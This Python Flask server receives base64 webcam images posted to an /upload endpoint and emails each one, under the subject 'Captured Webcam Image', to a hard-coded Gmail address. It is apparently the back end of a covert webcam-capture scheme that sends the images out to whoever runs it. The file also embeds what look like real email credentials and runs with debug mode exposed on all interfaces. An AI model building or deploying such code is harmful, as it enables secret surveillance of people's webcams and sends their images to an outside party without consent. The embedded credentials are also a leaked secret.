from flask import Flask, request, jsonify
import base64
import smtplib
import os
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage

app = Flask(__name__)

# Secure email configuration using environment variables
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS", "ddbb72885@gmail.com")  # Replace with your email
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "Kcn@123456")  # Use an App Password
TO_EMAIL = os.getenv("TO_EMAIL", "chriskelvin890@gmail.com")  # Recipient email

def send_email(image_data):
    try:
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = TO_EMAIL
        msg['Subject'] = "Captured Webcam Image"

        image = MIMEImage(image_data, name="captured_image.png")
        msg.attach(image)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, TO_EMAIL, msg.as_string())
        server.quit()
        print("✅ Email sent successfully!")
        return True
    except Exception as e:
        print(f"❌ Email sending failed: {e}")
        return False

@app.route('/upload', methods=['POST'])
def upload():
    try:
        data = request.json.get('image')
        if not data:
            return jsonify({"error": "No image data received"}), 400

        image_data = base64.b64decode(data.split(',')[1])

        if send_email(image_data):
            return jsonify({"status": "Image sent to email"}), 200
        else:
            return jsonify({"error": "Failed to send email"}), 500
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)  # Debug mode for testing

